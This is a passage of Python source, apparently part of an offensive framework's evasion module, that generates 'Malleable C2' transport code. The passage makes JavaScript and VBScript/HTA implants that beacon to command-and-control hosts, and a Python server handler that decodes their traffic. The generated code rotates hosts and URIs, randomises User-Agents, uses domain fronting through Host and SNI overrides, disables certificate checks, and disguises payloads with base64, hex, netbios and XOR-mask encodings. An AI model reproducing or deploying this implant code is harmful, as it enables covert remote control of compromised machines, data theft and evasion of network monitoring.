                    const result = Buffer.alloc(raw.length - 1);
                    for (let i = 1; i < raw.length; i++) result[i-1] = raw[i] ^ k;
                    return result;
                }}
                default: return Buffer.from(encoded, 'base64');
            }}
        }}

        function _resolveHeaders(hdrs, agentId) {{
            const resolved = {{}};
            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
            for (const [k, v] of Object.entries(hdrs)) {{
                let val = v.replace(/\\{{\\{{AGENT_ID\\}}\\}}/g, agentId || '');
                let rand = '';
                for (let i = 0; i < 12; i++) rand += chars[Math.floor(Math.random() * chars.length)];
                val = val.replace(/\\{{\\{{RAND\\}}\\}}/g, rand);
                resolved[k] = val;
            }}
            if (_C2_USER_AGENTS.length) {{
                resolved['User-Agent'] = _C2_USER_AGENTS[Math.floor(Math.random() * _C2_USER_AGENTS.length)];
            }}
            if (_C2_DF_HOST) resolved['Host'] = _C2_DF_HOST;
            return resolved;
        }}

        function _httpRequest(method, host, uri, headers, body) {{
            return new Promise((resolve, reject) => {{
                const mod = (C2_PORT === 443) ? _https : _http;
                const opts = {{
                    hostname: host,
                    port: C2_PORT,
                    path: uri,
                    method: method,
                    headers: headers,
                    rejectUnauthorized: false,
                }};
                if (_C2_DF_SNI) opts.servername = _C2_DF_SNI;
                const req = mod.request(opts, (res) => {{
                    let data = '';
                    res.on('data', (c) => data += c);
                    res.on('end', () => resolve(data));
                }});
                req.on('error', (e) => reject(e));
                if (body) req.write(body);
                req.end();
            }});
        }}

        async function transportSend(data, agentId) {{
            const host = _nextHost();
            const uri = _nextPostUri();
            const encoded = _C2_POST_PREPEND + _applyTransform(Buffer.from(data), _C2_POST_TRANSFORM) + _C2_POST_APPEND;
            const hdrs = _resolveHeaders(_C2_POST_HEADERS, agentId);
            hdrs['Content-Length'] = Buffer.byteLength(encoded);
            try {{
                const resp = await _httpRequest('POST', host, uri, hdrs, encoded);
                if (resp) {{
                    let stripped = resp;
                    if (_C2_GET_PREPEND && stripped.startsWith(_C2_GET_PREPEND))
                        stripped = stripped.slice(_C2_GET_PREPEND.length);
                    if (_C2_GET_APPEND && stripped.endsWith(_C2_GET_APPEND))
                        stripped = stripped.slice(0, -_C2_GET_APPEND.length);
                    return _reverseTransform(stripped, _C2_GET_TRANSFORM);
                }}
            }} catch (e) {{
                if (_C2_HOST_STRATEGY === 'failover') _hostsDown.add(host);
            }}
            return null;
        }}

        async function transportRecv(agentId) {{
            const host = _nextHost();
            const uri = _nextGetUri();
            const hdrs = _resolveHeaders(_C2_GET_HEADERS, agentId);
            try {{
                const resp = await _httpRequest('GET', host, uri, hdrs, null);
                if (resp) {{
                    let stripped = resp;
                    if (_C2_GET_PREPEND && stripped.startsWith(_C2_GET_PREPEND))
                        stripped = stripped.slice(_C2_GET_PREPEND.length);
                    if (_C2_GET_APPEND && stripped.endsWith(_C2_GET_APPEND))
                        stripped = stripped.slice(0, -_C2_GET_APPEND.length);
                    return _reverseTransform(stripped, _C2_GET_TRANSFORM);
                }}
            }} catch (e) {{
                if (_C2_HOST_STRATEGY === 'failover') _hostsDown.add(host);
            }}
            return null;
        }}
    """)


# ---------------------------------------------------------------------------
# VBScript (HTA) transport generation
# ---------------------------------------------------------------------------


def _generate_vbscript_transport(profile: Profile) -> str:
    """Generate VBScript HTTP transport using MSXML2.ServerXMLHTTP."""
    get_uris_vbs = "Array(" + ", ".join(f'"{u}"' for u in profile.http_get.uris) + ")"
    post_uris_vbs = "Array(" + ", ".join(f'"{u}"' for u in profile.http_post.uris) + ")"
    hosts_vbs = "Array(" + ", ".join(f'"{h}"' for h in profile.host_rotation.hosts) + ")"

    df_host = ""
    if profile.host_rotation.domain_fronting:
        df_host = profile.host_rotation.domain_fronting.host

    # Build header-setting lines for GET and POST
    get_hdr_lines = _vbs_set_headers(profile.http_get.headers, "oHttp")
    post_hdr_lines = _vbs_set_headers(profile.http_post.headers, "oHttp")

    return textwrap.dedent(f"""\
        ' --- Malleable C2 HTTP Transport ({profile.name}) ---
        Dim arrGetURIs, arrPostURIs, arrHosts
        Dim intHostIdx, intGetIdx, intPostIdx
        arrGetURIs = {get_uris_vbs}
        arrPostURIs = {post_uris_vbs}
        arrHosts = {hosts_vbs}
        intHostIdx = 0 : intGetIdx = 0 : intPostIdx = 0

        Function GetNextHost()
            If UBound(arrHosts) < 0 Then
                GetNextHost = C2_HOST
                Exit Function
            End If
            GetNextHost = arrHosts(intHostIdx Mod (UBound(arrHosts) + 1))
            intHostIdx = (intHostIdx + 1) Mod (UBound(arrHosts) + 1)
        End Function

        Function GetNextGetUri()
            GetNextGetUri = arrGetURIs(intGetIdx Mod (UBound(arrGetURIs) + 1))
            intGetIdx = (intGetIdx + 1) Mod (UBound(arrGetURIs) + 1)
        End Function

        Function GetNextPostUri()
            GetNextPostUri = arrPostURIs(intPostIdx Mod (UBound(arrPostURIs) + 1))
            intPostIdx = (intPostIdx + 1) Mod (UBound(arrPostURIs) + 1)
        End Function

        Function Base64Encode(arrBytes)
            Dim oXML, oNode
            Set oXML = CreateObject("MSXML2.DOMDocument")
            Set oNode = oXML.createElement("b64")
            oNode.DataType = "bin.base64"
            oNode.nodeTypedValue = arrBytes
            Base64Encode = Replace(Replace(oNode.Text, vbCr, ""), vbLf, "")
            Set oNode = Nothing : Set oXML = Nothing
        End Function

        Function Base64Decode(strB64)
            Dim oXML, oNode
            Set oXML = CreateObject("MSXML2.DOMDocument")
            Set oNode = oXML.createElement("b64")
            oNode.DataType = "bin.base64"
            oNode.Text = strB64
            Base64Decode = oNode.nodeTypedValue
            Set oNode = Nothing : Set oXML = Nothing
        End Function

        Function ApplyTransform(arrBytes, strTransform)
            ApplyTransform = Base64Encode(arrBytes)
        End Function

        Function ReverseTransform(strEncoded, strTransform)
            ReverseTransform = Base64Decode(strEncoded)
        End Function

        Function BuildUrl(strHost, strUri)
            Dim strScheme, strPort
            If C2_PORT = 443 Then strScheme = "https" Else strScheme = "http"
            If C2_PORT = 80 Or C2_PORT = 443 Then strPort = "" Else strPort = ":" & C2_PORT
            BuildUrl = strScheme & "://" & strHost & strPort & strUri
        End Function

        Function TransportSend(arrData, strAgentId)
            Dim oHttp, strUrl, strEncoded, strResp
            Set oHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
            strUrl = BuildUrl(GetNextHost(), GetNextPostUri())
            strEncoded = "{_vbs_escape(profile.http_post.body.prepend)}" & ApplyTransform(arrData, "{profile.http_post.body.transform}") & "{_vbs_escape(profile.http_post.body.append)}"
            oHttp.Open "POST", strUrl, False
        {post_hdr_lines}
            {_vbs_df_host_line(df_host)}
            oHttp.Send strEncoded
            strResp = oHttp.ResponseText
            If Len(strResp) > 0 Then
                TransportSend = ReverseTransform(strResp, "{profile.http_get.body.transform}")
            Else
                TransportSend = ""
            End If
            Set oHttp = Nothing
        End Function

        Function TransportRecv(strAgentId)
            Dim oHttp, strUrl, strResp, strStripped
            Set oHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
            strUrl = BuildUrl(GetNextHost(), GetNextGetUri())
            oHttp.Open "GET", strUrl, False
        {get_hdr_lines}
            {_vbs_df_host_line(df_host)}
            oHttp.Send
            strResp = oHttp.ResponseText
            If Len(strResp) > 0 Then
                strStripped = strResp
                TransportRecv = ReverseTransform(strStripped, "{profile.http_get.body.transform}")
            Else
                TransportRecv = ""
            End If
            Set oHttp = Nothing
        End Function
    """)


# ---------------------------------------------------------------------------
# Server handler code generation
# ---------------------------------------------------------------------------


def _generate_server_handler_code(profile: Profile) -> str:
    """Generate Python code for the server-side HTTP handler that reverses
    the profile transform pipeline."""
    get_uris = repr(profile.http_get.uris)
    post_uris = repr(profile.http_post.uris)
    get_headers = repr(profile.http_get.headers)
    post_headers = repr(profile.http_post.headers)

    return textwrap.dedent(f"""\
        # --- Server-side profile handler for '{profile.name}' ---
        # Auto-generated by evasion.profiles.generate_server_handler()

        import base64
        import random

        PROFILE_NAME = {repr(profile.name)}
        PROFILE_GET_URIS = {get_uris}
        PROFILE_POST_URIS = {post_uris}
        PROFILE_GET_HEADERS = {get_headers}
        PROFILE_POST_HEADERS = {post_headers}
        PROFILE_GET_PREPEND = {repr(profile.http_get.body.prepend)}
        PROFILE_GET_APPEND = {repr(profile.http_get.body.append)}
        PROFILE_GET_TRANSFORM = {repr(profile.http_get.body.transform)}
        PROFILE_POST_PREPEND = {repr(profile.http_post.body.prepend)}
        PROFILE_POST_APPEND = {repr(profile.http_post.body.append)}
        PROFILE_POST_TRANSFORM = {repr(profile.http_post.body.transform)}


        def _reverse_transform(encoded, transform):
            if transform == "base64":
                return base64.b64decode(encoded)
            elif transform == "base64url":
                return base64.urlsafe_b64decode(encoded)
            elif transform == "hex":
                return bytes.fromhex(encoded)
            elif transform == "netbios":
                r = bytearray()
                for i in range(0, len(encoded), 2):
                    hi = ord(encoded[i]) - ord('a')
                    lo = ord(encoded[i+1]) - ord('a')
                    r.append((hi << 4) | lo)
                return bytes(r)
            elif transform == "mask":
                raw = base64.b64decode(encoded)
                k = raw[0]
                return bytes(b ^ k for b in raw[1:])
            return base64.b64decode(encoded)


        def _apply_transform(data, transform):
            if transform == "base64":
                return base64.b64encode(data).decode()
            elif transform == "base64url":
                return base64.urlsafe_b64encode(data).decode()
            elif transform == "hex":
                return data.hex()
            elif transform == "netbios":
                o = []
                for b in data:
                    o.append(chr(ord('a') + ((b >> 4) & 0x0F)))
                    o.append(chr(ord('a') + (b & 0x0F)))
                return ''.join(o)
            elif transform == "mask":
                k = random.randint(1, 255)
                masked = bytes([k]) + bytes(b ^ k for b in data)
                return base64.b64encode(masked).decode()
            return base64.b64encode(data).decode()


        def matches_profile_uri(path, method):
            \"\"\"Check if an incoming request path matches a profile URI.\"\"\"
            if method.upper() == "GET":
                return path in PROFILE_GET_URIS
            elif method.upper() == "POST":
                return path in PROFILE_POST_URIS
            return False


        def decode_request(body_str, method="POST"):
            \"\"\"Decode an incoming profiled request body to raw bytes.

            For POST requests, strips the post prepend/append and reverses
            the post transform.  For GET responses being decoded on receipt,
            uses the GET config.
            \"\"\"
            if method.upper() == "POST":
                prepend = PROFILE_POST_PREPEND
                append = PROFILE_POST_APPEND
                transform = PROFILE_POST_TRANSFORM
            else:
                prepend = PROFILE_GET_PREPEND
                append = PROFILE_GET_APPEND
                transform = PROFILE_GET_TRANSFORM

            stripped = body_str
            if prepend and stripped.startswith(prepend):
                stripped = stripped[len(prepend):]
            if append and stripped.endswith(append):
                stripped = stripped[:-len(append)]
            return _reverse_transform(stripped, transform)


        def encode_response(data, method="GET"):
            \"\"\"Encode raw bytes into a profiled response body.

            For GET responses (tasking), applies the GET body config.
            For POST responses (ack), applies the GET body config (server
            responds in the GET format).
            \"\"\"
            prepend = PROFILE_GET_PREPEND
            append = PROFILE_GET_APPEND
            transform = PROFILE_GET_TRANSFORM
            encoded = _apply_transform(data, transform)
            return prepend + encoded + append
    """)


# ---------------------------------------------------------------------------
# Helper utilities
# ---------------------------------------------------------------------------


def _dict_to_ps_hashtable(d: dict[str, str]) -> str:
    """Convert a Python dict to a PowerShell hashtable literal."""
    if not d:
        return "@{}"
    items = "; ".join(f"'{k}' = '{_ps_escape(v)}'" for k, v in d.items())
    return f"@{{ {items} }}"


def _ps_escape(s: str) -> str:
    """Escape a string for embedding in PowerShell single-quoted strings."""
    return s.replace("'", "''")


def _js_escape(s: str) -> str:
    """Escape a string for embedding in JavaScript single-quoted strings."""
    return s.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n")


def _dict_to_js_object(d: dict[str, str]) -> str:
    """Convert a Python dict to a JavaScript object literal."""
    if not d:
        return "{}"
    items = ", ".join(f"'{_js_escape(k)}': '{_js_escape(v)}'" for k, v in d.items())
    return f"{{ {items} }}"


def _vbs_escape(s: str) -> str:
    """Escape a string for embedding in VBScript double-quoted strings."""
    return s.replace('"', '""')


def _vbs_set_headers(headers: dict[str, str], obj_name: str) -> str:
    """Generate VBScript lines to set HTTP headers."""
    lines = []
    for k, v in headers.items():
        lines.append(f'    {obj_name}.setRequestHeader "{k}", "{_vbs_escape(v)}"')
    return "\n".join(lines)


def _vbs_df_host_line(df_host: str) -> str:
    """Generate VBScript line to override Host header for domain fronting."""
    if df_host:
        return f'oHttp.setRequestHeader "Host", "{_vbs_escape(df_host)}"'
    return "' No domain fronting configured"
